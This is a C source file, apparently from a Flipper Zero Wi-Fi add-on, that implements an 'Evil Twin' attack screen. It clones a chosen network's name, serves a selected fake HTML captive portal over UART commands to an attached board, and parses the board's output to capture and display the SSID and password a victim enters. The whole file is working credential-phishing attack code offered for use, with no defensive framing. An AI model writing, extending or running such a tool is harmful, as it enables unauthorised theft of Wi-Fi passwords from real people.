/**
 * Evil Twin Attack Screen
 * 
 * Memory lifecycle:
 * - screen_evil_twin_create(): Allocates EvilTwinData, FuriString, FuriThread, View, html_files
 * - evil_twin_cleanup(): Called by screen_pop, frees all allocated resources
 */

#include "screen_attacks.h"
#include "uart_comm.h"
#include "screen.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// ============================================================================
// Data Structures
// ============================================================================

struct EvilTwinData {
    WiFiApp* app;
    uint8_t state;                  // 0 = select evil name, 1 = select HTML, 2 = attack running
    uint8_t html_selection;
    uint8_t evil_name_selection;
    uint32_t selected_indices[50];
    uint32_t selected_count;
    bool html_loaded;
    volatile bool attack_finished;
    bool password_received;
    bool portal_shutdown;
    bool password_verified;
    FuriString* status_message;
    View* view;
    FuriThread* thread;
    char** html_files;
    uint8_t html_file_count;
};

typedef struct {
    EvilTwinData* data;
} EvilTwinModel;

// ============================================================================
// Cleanup - Frees all screen resources
// ============================================================================

void evil_twin_cleanup(View* view, void* data) {
    UNUSED(view);
    EvilTwinData* d = (EvilTwinData*)data;
    if(!d) return;
    
    // Signal thread to stop and wait
    d->attack_finished = true;
    if(d->thread) {
        furi_thread_join(d->thread);
        furi_thread_free(d->thread);
    }
    
    // Free HTML file list
    if(d->html_files) {
        for(uint8_t i = 0; i < d->html_file_count; i++) {
            if(d->html_files[i]) free(d->html_files[i]);
        }
        free(d->html_files);
    }
    
    // Free string resources
    if(d->status_message) {
        furi_string_free(d->status_message);
    }
    
    free(d);
}

// ============================================================================
// Helper Functions
// ============================================================================

static void evil_twin_build_selected_list(EvilTwinData* data) {
    data->selected_count = data->app->selected_count;
    if(data->selected_count > 50) data->selected_count = 50;
    for(uint32_t i = 0; i < data->selected_count; i++) {
        data->selected_indices[i] = data->app->selected_networks[i];
    }
}

static const char* evil_twin_get_network_name(WiFiApp* app, uint32_t index_one_based) {
    if(!app || !app->scan_results || index_one_based == 0 || index_one_based > app->scan_result_count) {
        return "(hidden)";
    }
    const char* name = app->scan_results[index_one_based - 1].ssid;
    return (name && name[0]) ? name : "(hidden)";
}

// ============================================================================
// Drawing - Evil Name Selection
// ============================================================================

static void evil_twin_name_draw(Canvas* canvas, EvilTwinData* data) {
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    screen_draw_title(canvas, "Select Evil Name");
    
    canvas_set_font(canvas, FontSecondary);
    if(data->selected_count == 0) {
        screen_draw_centered_text(canvas, "No networks", 32);
        screen_draw_centered_text(canvas, "selected", 44);
        return;
    }

    const uint8_t max_visible = 5;
    uint8_t start = 0;
    if(data->evil_name_selection >= max_visible) {
        start = data->evil_name_selection - (max_visible - 1);
    }

    uint8_t y = 22;
    for(uint8_t i = start; i < data->selected_count && i < start + max_visible; i++) {
        uint8_t display_y = y + ((i - start) * 10);
        const char* name = evil_twin_get_network_name(data->app, data->selected_indices[i]);
        if(i == data->evil_name_selection) {
            canvas_draw_box(canvas, 0, display_y - 8, 128, 10);
            canvas_set_color(canvas, ColorWhite);
            canvas_draw_str(canvas, 2, display_y, name);
            canvas_set_color(canvas, ColorBlack);
        } else {
            canvas_draw_str(canvas, 2, display_y, name);
        }
    }
}

// ============================================================================
// Drawing - HTML Selection
// ============================================================================

static void evil_twin_html_draw(Canvas* canvas, EvilTwinData* data) {
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    screen_draw_title(canvas, "Select HTML Portal");
    
    canvas_set_font(canvas, FontSecondary);

    if(!data->html_loaded) {
        screen_draw_centered_text(canvas, "Loading...", 32);
        return;
    }
    if(data->html_file_count == 0) {
        screen_draw_centered_text(canvas, "No HTML files", 32);
        return;
    }

    uint8_t y = 22;
    const uint8_t max_visible = 5;
    uint8_t start = 0;
    if(data->html_selection >= max_visible) {
        start = data->html_selection - (max_visible - 1);
    }
    
    for(uint8_t i = start; i < data->html_file_count && i < start + max_visible; i++) {
        uint8_t display_y = y + ((i - start) * 10);
        if(i == data->html_selection) {
            canvas_draw_box(canvas, 0, display_y - 8, 128, 10);
            canvas_set_color(canvas, ColorWhite);
            canvas_draw_str(canvas, 2, display_y, data->html_files[i]);
            canvas_set_color(canvas, ColorBlack);
        } else {
            canvas_draw_str(canvas, 2, display_y, data->html_files[i]);
        }
    }
}

// ============================================================================
// Drawing - Attack Running
// ============================================================================

static void evil_twin_attack_draw(Canvas* canvas, EvilTwinData* data) {
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    screen_draw_title(canvas, "Evil Twin");
    
    canvas_set_font(canvas, FontSecondary);
    
    if(data->password_received) {
        screen_draw_centered_text(canvas, "Success!", 32);
        screen_draw_status(canvas, "SSID: ", 48);
        canvas_draw_str(canvas, 40, 48, furi_string_get_cstr(data->app->current_ssid));
        screen_draw_status(canvas, "Password: ", 58);
        canvas_draw_str(canvas, 60, 58, furi_string_get_cstr(data->app->current_password));
    } else {
        screen_draw_status(canvas, "Evil Twin ongoing:", 24);
        uint8_t y = 36;
        uint8_t shown = 0;

        if(data->selected_count > 0) {
            uint32_t evil_idx = data->selected_indices[data->evil_name_selection];
            const char* evil_name = evil_twin_get_network_name(data->app, evil_idx);
            canvas_draw_str(canvas, 2, y, evil_name);
            y += 10;
            shown++;

            for(uint32_t i = 0; i < data->selected_count && shown < 4; i++) {
                uint32_t idx = data->selected_indices[i];
                if(idx == evil_idx) continue;
                const char* name = evil_twin_get_network_name(data->app, idx);
                canvas_draw_str(canvas, 2, y, name);
                y += 10;
                shown++;
            }
        }
    }
}

static void evil_twin_draw(Canvas* canvas, void* model) {
    EvilTwinModel* m = (EvilTwinModel*)model;
    if(!m || !m->data) return;
    EvilTwinData* data = m->data;
    
    if(data->state == 0) {
        evil_twin_name_draw(canvas, data);
    } else if(data->state == 1) {
        evil_twin_html_draw(canvas, data);
    } else {
        evil_twin_attack_draw(canvas, data);
    }
}

// ============================================================================
// Input Handling
// ============================================================================

static bool evil_twin_name_input(EvilTwinData* data, InputEvent* event) {
    bool is_navigation = (event->key == InputKeyUp || event->key == InputKeyDown);
    if(is_navigation) {
        if(event->type != InputTypePress && event->type != InputTypeRepeat) return false;
    } else {
        if(event->type != InputTypeShort) return false;
    }
    
    if(event->key == InputKeyUp) {
        if(data->evil_name_selection > 0) data->evil_name_selection--;
    } else if(event->key == InputKeyDown) {
        if(((uint32_t)data->evil_name_selection + 1) < data->selected_count) data->evil_name_selection++;
    } else if(event->key == InputKeyOk) {
        if(data->selected_count > 0) data->state = 1;
    } else if(event->key == InputKeyBack) {
        return false;
    }
    return true;
}

static bool evil_twin_html_input(EvilTwinData* data, InputEvent* event) {
    bool is_navigation = (event->key == InputKeyUp || event->key == InputKeyDown);
    if(is_navigation) {
        if(event->type != InputTypePress && event->type != InputTypeRepeat) return false;
    } else {
        if(event->type != InputTypeShort) return false;
    }
    
    if(!data->html_loaded) return false;
    
    if(event->key == InputKeyUp) {
        if(data->html_selection > 0) data->html_selection--;
    } else if(event->key == InputKeyDown) {
        if(((uint32_t)data->html_selection + 1) < data->html_file_count) data->html_selection++;
    } else if(event->key == InputKeyOk) {
        if(data->html_file_count > 0) data->state = 2;
    } else if(event->key == InputKeyBack) {
        data->state = 0;
    }
    return true;
}

static bool evil_twin_attack_input(EvilTwinData* data, InputEvent* event) {
    if(event->type != InputTypeShort) return false;
    
    if(event->key == InputKeyBack) {
        data->attack_finished = true;
        uart_send_command(data->app, "stop");
        return false;
    }
    return true;
}

static bool evil_twin_input(InputEvent* event, void* context) {
    View* view = (View*)context;
    if(!view) return false;
    
    EvilTwinModel* m = view_get_model(view);
    if(!m || !m->data) {
        view_commit_model(view, false);
        return false;
    }
    EvilTwinData* data = m->data;
    
    bool handled = true;
    if(data->state == 0) {
        handled = evil_twin_name_input(data, event);
    } else if(data->state == 1) {
        handled = evil_twin_html_input(data, event);
    } else {
        handled = evil_twin_attack_input(data, event);
    }
    
    if(!handled && event->key == InputKeyBack) {
        data->attack_finished = true;
        uart_send_command(data->app, "stop");
        view_commit_model(view, false);
        screen_pop_to_main(data->app);
        return true;
    }
    
    view_commit_model(view, true);
    return true;
}

// ============================================================================
// Attack Thread
// ============================================================================

static int32_t evil_twin_thread(void* context) {
    EvilTwinData* data = (EvilTwinData*)context;
    WiFiApp* app = data->app;

    uart_clear_buffer(app);
    uart_send_command(app, "list_sd");
    furi_delay_ms(100);

    // Parse HTML file list
    uint32_t start = furi_get_tick();
    uint32_t last_rx = start;
    while((furi_get_tick() - last_rx) < 1000 && (furi_get_tick() - start) < 8000 && !data->attack_finished) {
        const char* line = uart_read_line(app, 300);
        if(line) {
            last_rx = furi_get_tick();
            if(strstr(line, "HTML files") || strstr(line, "SD card")) continue;
            
            uint32_t idx = 0;
            char name[64] = {0};
            if(sscanf(line, "%lu %63s", &idx, name) == 2 && idx > 0 && name[0] != '\0') {
                char** new_files = realloc(data->html_files, (data->html_file_count + 1) * sizeof(char*));
                if(new_files) {
                    data->html_files = new_files;
                    data->html_files[data->html_file_count] = malloc(strlen(name) + 1);
                    if(data->html_files[data->html_file_count]) {
                        strcpy(data->html_files[data->html_file_count], name);
                        data->html_file_count++;
                    }
                }
            }
        }
    }
    data->html_loaded = true;

    // Wait for user selection
    while(data->state < 2 && !data->attack_finished) {
        furi_delay_ms(100);
    }
    if(data->attack_finished) return 0;

    // Send select_html command
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "select_html %u", data->html_selection + 1);
    uart_send_command(app, cmd);
    furi_delay_ms(500);
    uart_clear_buffer(app);

    // Build select_networks command
    char select_cmd[256];
    size_t select_pos = snprintf(select_cmd, sizeof(select_cmd), "select_networks");
    uint32_t evil_idx = 0;
    if(data->selected_count > 0 && data->evil_name_selection < data->selected_count) {
        evil_idx = data->selected_indices[data->evil_name_selection];
    }
    if(evil_idx > 0) {
        select_pos += snprintf(select_cmd + select_pos, sizeof(select_cmd) - select_pos, " %lu", evil_idx);
    }
    for(uint32_t i = 0; i < data->selected_count; i++) {
        uint32_t idx = data->selected_indices[i];
        if(idx == evil_idx) continue;
        select_pos += snprintf(select_cmd + select_pos, sizeof(select_cmd) - select_pos, " %lu", idx);
    }
    uart_send_command(app, select_cmd);
    furi_delay_ms(500);
    uart_clear_buffer(app);

    // Start evil twin attack
    uart_send_command(app, "start_evil_twin");
    
    // Monitor for password
    while(!data->password_received && !data->attack_finished) {
        const char* line = uart_read_line(app, 1000);
        if(line) {
            furi_string_set(data->status_message, line);
            
            if(strstr(line, "Wi-Fi: connected to SSID=")) {
                const char* ssid_start = strstr(line, "SSID='");
                if(ssid_start) {
                    ssid_start += 6;
                    char* ssid_end = strchr(ssid_start, '\'');
                    if(ssid_end) {
                        furi_string_set_strn(app->current_ssid, ssid_start, ssid_end - ssid_start);
                    }
                }
                
                const char* pwd_start = strstr(line, "password='");
                if(pwd_start) {
                    pwd_start += 10;
                    char* pwd_end = strchr(pwd_start, '\'');
                    if(pwd_end) {
                        furi_string_set_strn(app->current_password, pwd_start, pwd_end - pwd_start);
                    }
                }
            }
            
            if(strstr(line, "Password verified!")) data->password_verified = true;
            if(strstr(line, "Evil Twin portal shut down")) {
                data->portal_shutdown = true;
                data->attack_finished = true;
            }
            if(data->portal_shutdown && data->password_verified) {
                data->password_received = true;
            }
        }
        furi_delay_ms(100);
    }
    
    return 0;
}

// ============================================================================
// Screen Creation
// ============================================================================

View* screen_evil_twin_create(WiFiApp* app, EvilTwinData** out_data) {
    // Allocate screen data
    EvilTwinData* data = (EvilTwinData*)malloc(sizeof(EvilTwinData));
    if(!data) return NULL;
    
    data->app = app;
    data->state = 0;
    data->html_selection = 0;
    data->evil_name_selection = 0;
    data->selected_count = 0;
    data->html_loaded = false;
    data->attack_finished = false;
    data->password_received = false;
    data->portal_shutdown = false;
    data->password_verified = false;
    data->status_message = furi_string_alloc();
    data->thread = NULL;
    data->html_files = NULL;
    data->html_file_count = 0;

    evil_twin_build_selected_list(data);
    
    // Allocate view
    View* view = view_alloc();
    if(!view) {
        furi_string_free(data->status_message);
        free(data);
        return NULL;
    }
    
    data->view = view;
    
    // Setup view model
    view_allocate_model(view, ViewModelTypeLocking, sizeof(EvilTwinModel));
    EvilTwinModel* m = view_get_model(view);
    m->data = data;
    view_commit_model(view, true);
    
    view_set_draw_callback(view, evil_twin_draw);
    view_set_input_callback(view, evil_twin_input);
    view_set_context(view, view);
    
    // Start thread
    FuriThread* thread = furi_thread_alloc();
    data->thread = thread;
    furi_thread_set_name(thread, "EvilTwinAttack");
    furi_thread_set_stack_size(thread, 2048);
    furi_thread_set_callback(thread, evil_twin_thread);
    furi_thread_set_context(thread, data);
    furi_thread_start(thread);
    
    if(out_data) *out_data = data;
    return view;
}
